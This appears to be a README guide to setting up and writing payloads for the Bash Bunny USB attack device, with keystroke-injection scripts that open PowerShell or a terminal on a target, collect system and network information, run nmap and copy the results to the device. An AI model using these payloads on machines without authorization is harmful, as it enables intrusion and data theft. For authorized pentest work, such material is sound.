# Bash Bunny Payload Setup Guide

## Overview
The Bash Bunny is a multi-function USB attack platform that can emulate keyboards, storage devices, network adapters, and serial devices. Payloads are written in bash with special Bash Bunny-specific commands.

## Initial Bash Bunny Setup

### First-Time Configuration

1. **Connect Bash Bunny in Arming Mode**
   - Set switch to position closest to USB connector (Switch 3)
   - Plug into computer
   - Wait for LED to turn blue (solid)
   - Bash Bunny appears as USB storage device

2. **Update Firmware (Recommended)**
   - Download latest firmware: https://downloads.hak5.org/bunny
   - Copy firmware `.tar.gz` file to root of Bash Bunny
   - Safely eject
   - Replug - Bash Bunny will update (flashing LEDs)
   - Wait for completion (solid LED)

3. **File System Structure**
```
   /
   ├── payloads/
   │   ├── switch1/
   │   │   └── payload.txt
   │   ├── switch2/
   │   │   └── payload.txt
   │   └── library/          # Payload library
   ├── loot/                 # Data collection folder
   ├── tools/                # Additional tools/scripts
   ├── languages/            # Keyboard layouts
   └── version.txt           # Firmware version
```

## Payload Deployment

### Switch-Based Operation

The Bash Bunny has a **3-position switch**:

- **Switch 3 (Closest to USB)**: Arming Mode
  - Access file system
  - Configure payloads
  - Update firmware
  
- **Switch 1**: Runs `/payloads/switch1/payload.txt`
- **Switch 2**: Runs `/payloads/switch2/payload.txt`

### Installing a Payload

1. **Set to Arming Mode** (Switch 3)
2. **Connect** to computer
3. **Navigate** to `/payloads/switch1/` or `/payloads/switch2/`
4. **Copy** your `payload.txt` to the desired switch folder
5. **Safely eject**
6. **Set switch** to position 1 or 2
7. **Plug into target** - payload executes automatically

## Creating Bash Bunny Payloads

### Basic Structure
```bash
#!/bin/bash
#
# Title:         Payload Name
# Description:   What this payload does
# Author:        Your Name
# Version:       1.0
# Category:      Category Name
# Target:        Windows 10/11 (or Linux, macOS)
# Attackmodes:   HID, Storage (or Ethernet, Serial)

# LED feedback for status
LED SETUP

# Set attack mode
ATTACKMODE HID STORAGE

# Wait for target to recognize device
LED ATTACK

# Your payload commands here
RUN WIN notepad
Q DELAY 1000
Q STRING Hello World!
Q ENTER

# Completion
LED FINISH
sync
```

### Attack Modes

The Bash Bunny can operate in multiple modes simultaneously:

**ATTACKMODE [mode1] [mode2] [mode3]**

Available modes:
- `HID` - Keyboard/Mouse emulation
- `STORAGE` - USB Mass Storage (access to /root/udisk)
- `ETHERNET` - Network adapter
- `SERIAL` - Serial console
- `RNDIS_ETHERNET` - Windows RNDIS network
- `ECM_ETHERNET` - Linux/Mac network

**Examples:**
```bash
ATTACKMODE HID                    # Keyboard only
ATTACKMODE HID STORAGE            # Keyboard + storage
ATTACKMODE STORAGE                # Storage only
ATTACKMODE ETHERNET               # Network adapter
ATTACKMODE HID STORAGE ETHERNET   # All three
```

## LED Status Indicators

### LED Colors
```bash
LED R           # Red
LED G           # Green  
LED B           # Blue
LED Y           # Yellow
LED C           # Cyan
LED M           # Magenta
LED W           # White
```

### LED Patterns
```bash
LED R           # Solid red
LED R SLOW      # Slow blinking red
LED R FAST      # Fast blinking red
LED R VERYFAST  # Very fast blinking red
LED R SINGLE    # Single blink
LED R DOUBLE    # Double blink
LED R TRIPLE    # Triple blink
```

### Standard LED Usage
```bash
LED SETUP       # Magenta - Setup/initialization
LED ATTACK      # Yellow - Active attack
LED SPECIAL     # Cyan - Special operation
LED FAIL        # Red - Failure/error
LED FINISH      # Green - Success/complete
```

## HID (Keyboard) Commands

### Keystroke Injection

For **Windows/Linux**:
```bash
RUN WIN notepad              # Windows + type "notepad"
RUN UNITY gnome-terminal     # Linux Unity
```

**Q Command** - Queue keystrokes:
```bash
Q GUI r                      # Windows + R
Q DELAY 500
Q STRING powershell
Q ENTER
```

### Key Commands
```bash
Q ENTER
Q SPACE
Q TAB
Q BACKSPACE
Q DELETE
Q ESC
Q UP / Q DOWN / Q LEFT / Q RIGHT
Q HOME / Q END
Q PAGEUP / Q PAGEDOWN
Q CTRL / Q ALT / Q SHIFT / Q GUI
Q F1 through Q F12
```

### Key Combinations
```bash
Q CTRL c                     # Ctrl+C
Q ALT F4                     # Alt+F4
Q GUI r                      # Win+R
Q CTRL ALT DELETE            # Ctrl+Alt+Del
```

### Delays
```bash
Q DELAY 500                  # Wait 500ms
```

## Data Exfiltration (Loot)

### Saving Data to Bash Bunny
```bash
# Set attack mode with storage
ATTACKMODE HID STORAGE

# Define loot directory
LOOT_DIR=/root/udisk/loot/payload_name_$(date +%Y%m%d_%H%M%S)
mkdir -p $LOOT_DIR

# Collect data
hostname > $LOOT_DIR/hostname.txt
date > $LOOT_DIR/collection_time.txt

# Example: Copy files from target
cp /path/to/target/file $LOOT_DIR/

# Ensure data is written
sync
```

### Loot Organization
```
/root/udisk/loot/
├── migration_data_20241229_120000/
│   ├── system_info.txt
│   ├── network_config.txt
│   └── installed_software.txt
├── network_scan_20241228_150000/
│   └── scan_results.txt
└── credentials_20241227_100000/
    └── found_creds.txt
```

## Platform-Specific Payloads

### Windows Payloads
```bash
#!/bin/bash
# Windows Information Gathering

LED SETUP
ATTACKMODE HID STORAGE

# Create loot directory
LOOT_DIR=/root/udisk/loot/windows_$(date +%Y%m%d_%H%M%S)
mkdir -p $LOOT_DIR

LED ATTACK

# Open PowerShell
RUN WIN powershell
Q DELAY 2000

# Collect system info
Q STRING systeminfo > info.txt
Q ENTER
Q DELAY 3000

# Copy to Bash Bunny
Q STRING "cp info.txt $(ls /media/*BASHBUNNY*/loot/windows_*/)"
Q ENTER

LED FINISH
sync
```

### Linux Payloads
```bash
#!/bin/bash
# Linux Information Gathering

LED SETUP
ATTACKMODE HID STORAGE

LOOT_DIR=/root/udisk/loot/linux_$(date +%Y%m%d_%H%M%S)
mkdir -p $LOOT_DIR

LED ATTACK

# Open terminal (may vary by distro)
RUN UNITY gnome-terminal
Q DELAY 2000

# Collect info
Q STRING "uname -a > /tmp/sysinfo.txt"
Q ENTER
Q DELAY 1000

Q STRING "ifconfig > /tmp/network.txt"
Q ENTER
Q DELAY 1000

# Copy to Bash Bunny
Q STRING "cp /tmp/*.txt /media/*/loot/linux_*/"
Q ENTER

LED FINISH
sync
```

## Network Mode (Ethernet)

### Basic Network Payload
```bash
#!/bin/bash
# Network Attack Mode

LED SETUP
ATTACKMODE ETHERNET

# Configure networking
GET TARGET_IP
GET TARGET_HOSTNAME

LED ATTACK

# Network operations
nmap -sV $TARGET_IP > /root/udisk/loot/nmap_scan.txt

LED FINISH
```

### Getting Target Information
```bash
GET TARGET_IP           # Target's IP address
GET TARGET_HOSTNAME     # Target's hostname
GET HOST_IP             # Bash Bunny's IP
```

## Advanced Features

### Extensions

Load additional functionality:
```bash
# Load extension
source /root/udisk/extensions/extension_name.sh

# Common extensions
GET                     # Network info gathering
RUN                     # Platform detection & app launching
```

### Bunny Helpers
```bash
# Get OS type
GET HOST_OS             # Returns "WINDOWS", "LINUX", "MACOS"

# Wait for target ready
LED SETUP
ATTACKMODE HID
sleep 3                 # Wait for HID to be ready
LED ATTACK
```

## Configuration Files

### config.txt (Optional)

Create `/root/udisk/config.txt` for global settings:
```bash
# Keyboard layout
DUCKY_LANG=us

# LED brightness (1-4)
LED_BRIGHTNESS=4

# Serial console
SERIAL_CONSOLE_ENABLED=Y
```

### Keyboard Layouts

Available in `/languages/`:
- `us` - US English
- `uk` - UK English  
- `de` - German
- `fr` - French
- `es` - Spanish
- Many more...

**Set in payload:**
```bash
DUCKY_LANG us
```

## Testing & Debugging

### Serial Console Access

1. **Enable serial console** in `config.txt`
2. **Connect** with serial terminal (115200 baud)
   - Linux: `screen /dev/ttyACM0 115200`
   - Windows: Use PuTTY or similar
3. **View** live payload execution and errors

### Debug Output
```bash
# Add debug output to payload
echo "Starting payload..." > /root/udisk/debug.log
echo "Attack mode set" >> /root/udisk/debug.log

# Check LED during execution
LED M SLOW   # Visual checkpoint
sleep 2
```

### Common Issues

**Payload not executing:**
- ✓ Check `payload.txt` is in correct switch folder
- ✓ Verify switch position (1 or 2, not 3)
- ✓ Check file permissions (should be executable)
- ✓ Review serial console for errors

**HID not working:**
- ✓ Increase delays after RUN commands
- ✓ Check keyboard layout matches target
- ✓ Verify ATTACKMODE includes HID

**Storage not mounting:**
- ✓ Ensure ATTACKMODE includes STORAGE
- ✓ Check target OS recognizes USB storage
- ✓ Try different USB port

## Payload Library

### Included Payloads

The Bash Bunny comes with payloads in `/payloads/library/`:
- Information gathering
- Network attacks
- Credential harvesting
- Exfiltration tools

**To use library payload:**
```bash
# Copy from library to switch folder
cp /payloads/library/example_payload/payload.txt /payloads/switch1/
```

## Best Practices

### 1. LED Feedback
Always use LED indicators to show payload status:
```bash
LED SETUP     # Starting
LED ATTACK    # Running
LED SPECIAL   # Optional step
LED FINISH    # Success
LED FAIL      # Error
```

### 2. Sync Data
Always sync before completion:
```bash
sync          # Flush data to storage
LED FINISH
```

### 3. Error Handling
```bash
if [ $? -eq 0 ]; then
    LED FINISH
else
    LED FAIL
fi
```

### 4. Timing
- Add appropriate delays for target OS
- Test on slowest expected hardware
- Allow extra time for USB recognition

### 5. Documentation
```bash
#!/bin/bash
#
# Title:         Clear payload name
# Description:   Detailed description
# Author:        Your name
# Version:       Version number
# Category:      Appropriate category
# Target:        Target OS/version
# Attackmodes:   Modes used
#
# LED Status:
# - Magenta: Setup
# - Yellow: Attack
# - Green: Complete
# - Red: Failure
```

## Security & Legal

### ⚠️ LEGAL NOTICE

**Authorized use only:**
- ✓ Personal systems you own
- ✓ Written permission from system owner
- ✓ Professional pentesting with contracts
- ✓ Educational labs with authorization

**Unauthorized computer access is illegal** under:
- Computer Fraud and Abuse Act (CFAA)
- Computer Misuse Act
- Similar laws worldwide

### Professional Use

1. **Obtain written authorization**
2. **Define scope clearly**
3. **Document all activities**
4. **Secure loot data appropriately**
5. **Follow responsible disclosure**

## Resources

- **Official Docs**: https://docs.hak5.org/bash-bunny/
- **Forums**: https://forums.hak5.org/forum/94-bash-bunny/
- **Payload Library**: https://github.com/hak5/bashbunny-payloads
- **Downloads**: https://downloads.hak5.org/bunny
- **Wiki**: https://wiki.bashbunny.com/

## Quick Reference Card
```bash
# Attack Modes
ATTACKMODE HID STORAGE ETHERNET

# LED Commands  
LED R|G|B|Y|C|M|W [SLOW|FAST|VERYFAST|SINGLE|DOUBLE|TRIPLE]
LED SETUP|ATTACK|SPECIAL|FAIL|FINISH

# HID Commands
RUN WIN|UNITY|OSX command
Q KEYSTROKE [DELAY ms]

# File Operations
LOOT_DIR=/root/udisk/loot/name
mkdir -p $LOOT_DIR
cp source $LOOT_DIR/
sync

# Network
GET TARGET_IP|TARGET_HOSTNAME|HOST_IP

# Keyboard Layout
DUCKY_LANG us|uk|de|fr|es
```

## Example Payloads

See individual payload files in this repository for:
- Windows migration data collection
- Linux system profiling
- Network reconnaissance
- Credential gathering
- File exfiltration

---

**Pacific NW Computers**  
Email: jon@pnwcomputers.com  
Phone: 360-624-7379

*Always use responsibly and legally.*
